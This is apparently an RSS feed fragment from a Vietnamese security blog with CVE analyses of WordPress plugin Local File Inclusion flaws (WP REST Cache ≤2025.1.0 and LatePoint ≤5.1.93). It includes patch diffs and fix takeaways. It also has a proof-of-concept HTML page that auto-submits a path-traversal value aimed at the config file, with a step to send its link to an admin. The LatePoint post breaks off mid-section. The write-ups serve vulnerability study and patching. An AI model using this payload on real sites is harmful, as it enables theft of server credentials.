&amp;#39;options-general.php&amp;#39;,&#xA;    &amp;#39;WP REST Cache&amp;#39;,&#xA;    &amp;#39;WP REST Cache&amp;#39;,&#xA;    $capability,&#xA;    &amp;#39;wp-rest-cache&amp;#39;,&#xA;    [&#xA;        $this,&#xA;        &amp;#39;settings_page&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tức khi truy cập endpoint&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;thì &lt;code&gt;settings_page()&lt;/code&gt; được gọi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Tạo trang web có form, tự động gửi request với LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost:80//wp-admin/options-general.php&amp;#34; method=&amp;#34;get&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;page&amp;#34; value=&amp;#34;wp-rest-cache&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;sub&amp;#34; value=&amp;#34;/../../../../../../wp-cofnig&amp;#34;&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;        document.forms[0].submit()&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Gửi link đến trang web cho admin hoặc người dùng có đặc quyền&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Cảnh báo&lt;/p&gt;&lt;p&gt;Lỗ hổng này chỉ khai thác được trên &lt;strong&gt;Windows&lt;/strong&gt;, vì hàm &lt;code&gt;file_exists()&lt;/code&gt; xử lý đường dẫn khác nhau giữa hai hệ điều hành. Trên &lt;strong&gt;Linux&lt;/strong&gt;, nếu đường dẫn chứa thư mục không tồn tại, hàm sẽ trả về &lt;code&gt;false&lt;/code&gt;. Trong khi đó, trên &lt;strong&gt;Windows&lt;/strong&gt;, cùng đường dẫn đó lại có thể trả về &lt;code&gt;true&lt;/code&gt;, khiến điều kiện kiểm tra bị bỏ qua và lỗ hổng có thể kích hoạt.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phiên bản &lt;strong&gt;≤ 2025.1.0&lt;/strong&gt; của WP REST Cache cho phép &lt;strong&gt;Local File Inclusion&lt;/strong&gt; qua tham số &lt;code&gt;sub&lt;/code&gt;. Bản vá &lt;strong&gt;2025.1.1&lt;/strong&gt; giải quyết bằng cách kiểm tra vị trí file trước khi include — đảm bảo file chỉ được nạp nếu nằm trong thư mục &lt;code&gt;partials&lt;/code&gt;, từ đó loại bỏ khả năng path traversal/LFI.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lấy dữ liệu trực tiếp từ request và ghép vào đường dẫn file là rủi ro LFI.&lt;/li&gt;&#xA;&lt;li&gt;Luôn xác thực &lt;strong&gt;vị trí thực tế&lt;/strong&gt; của file (đường dẫn tuyệt đối) trước khi include.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm soát phạm vi file bằng so sánh thư mục đích (whitelist) hiệu quả hơn chỉ sanitize ký tự.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra trên nhiều nền tảng (Windows/Linux) vì hành vi hàm file có thể khác nhau.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-rest-cache/vulnerability/wordpress-wp-rest-cache-2025-1-0-local-file-inclusion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress WP REST Cache Plugin &amp;lt;= 2025.1.0 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6715 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-19-cve-2025-6715/</link>
      <pubDate>Sun, 19 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-19-cve-2025-6715/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LatePoint&lt;/strong&gt; phiên bản &lt;strong&gt;≤ 5.1.93&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh &lt;code&gt;include/require&lt;/code&gt;, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6715&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6715&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.93&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.94&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/latepoint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;LatePoint&lt;/strong&gt;: &lt;strong&gt;5.1.93&lt;/strong&gt; (vulnerable) và &lt;strong&gt;5.1.94&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function render($view, $layout = &amp;#39;none&amp;#39;, $extra_vars = array()){&#xA;    $this-&amp;gt;vars[&amp;#39;route_name&amp;#39;] = $this-&amp;gt;route_name;&#xA;    extract($extra_vars);&#xA;    extract($this-&amp;gt;vars);&#xA;    ob_start();&#xA;    if($layout != &amp;#39;none&amp;#39;){&#xA;      // rendering layout, view variable will be passed and used in layout file&#xA;      include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this-&amp;gt;add_extension($layout, &amp;#39;.php&amp;#39;);&#xA;    }else{&#xA;      include $this-&amp;gt;add_extension($view, &amp;#39;.php&amp;#39;);&#xA;    }&#xA;    $response_html = ob_get_clean();&#xA;    return $response_html;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, hàm &lt;code&gt;render()&lt;/code&gt; gắn &lt;code&gt;.php&lt;/code&gt; vào &lt;code&gt;$layout&lt;/code&gt; và &lt;code&gt;include&lt;/code&gt; trực tiếp mà không kiểm tra, dẫn đến &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt; nếu &lt;code&gt;$layout&lt;/code&gt; bị kiểm soát từ đầu vào.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function render($view, $layout = &amp;#39;none&amp;#39;, $extra_vars = array()){&#xA;    $this-&amp;gt;vars[&amp;#39;route_name&amp;#39;] = $this-&amp;gt;route_name;&#xA;    extract($extra_vars);&#xA;    extract($this-&amp;gt;vars);&#xA;    ob_start();&#xA;    if($layout != &amp;#39;none&amp;#39;){&#xA;&#x9;&#x9;$layout_path = $this-&amp;gt;get_safe_layout_path($layout);&#xA;      // rendering layout, view variable will be passed and used in layout file&#xA;      if($layout_path){&#xA;&#x9;&#x9;  include $layout_path;&#xA;      }else{&#xA;&#x9;&#x9;  __(&amp;#39;Invalid layout&amp;#39;, &amp;#39;latepoint&amp;#39;);&#xA;      }&#xA;    }else{&#xA;      include $this-&amp;gt;add_extension($view, &amp;#39;.php&amp;#39;);&#xA;    }&#xA;    $response_html = ob_get_clean();&#xA;    return $response_html;&#xA;}&#xA;&#xA;private function get_safe_layout_path($layout) {&#xA;    // 1. Remove any path separators and null bytes&#xA;    $layout = str_replace([&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;, &amp;#34;\0&amp;#34;], &amp;#39;&amp;#39;, $layout);&#xA;&#xA;    // 2. Remove any dots to prevent directory traversal&#xA;    $layout = str_replace(&amp;#39;.&amp;#39;, &amp;#39;&amp;#39;, $layout);&#xA;&#xA;    // 3. Only allow alphanumeric, underscore, and hyphen&#xA;    $layout = preg_replace(&amp;#39;/[^a-zA-Z0-9_-]/&amp;#39;, &amp;#39;&amp;#39;, $layout);&#xA;&#xA;    // 4. Construct the full path&#xA;    $layout_file = $this-&amp;gt;add_extension($layout, &amp;#39;.php&amp;#39;);&#xA;    $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file;&#xA;&#xA;    // 5. Use realpath to resolve any remaining traversal attempts&#xA;    $real_path = realpath($full_path);&#xA;    $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH);&#xA;&#xA;    // 6. Ensure the resolved path is within the layouts directory&#xA;    if ($real_path &amp;amp;&amp;amp; $base_path &amp;amp;&amp;amp; strpos($real_path, $base_path) === 0) {&#xA;        return $real_path;&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã thêm &lt;code&gt;get_safe_layout_path()&lt;/code&gt; để loại bỏ &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt;, &lt;code&gt;.&lt;/code&gt; và null byte; chỉ cho phép &lt;code&gt;[A-Za-z0-9_-]&lt;/code&gt;; xây dựng đường dẫn, dùng &lt;code&gt;realpath()&lt;/code&gt; và so sánh với &lt;code&gt;LATEPOINT_VIEWS_LAYOUTS_ABSPATH&lt;/code&gt;. Nếu hợp lệ mới &lt;code&gt;include&lt;/code&gt;, ngăn chặn LFI.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 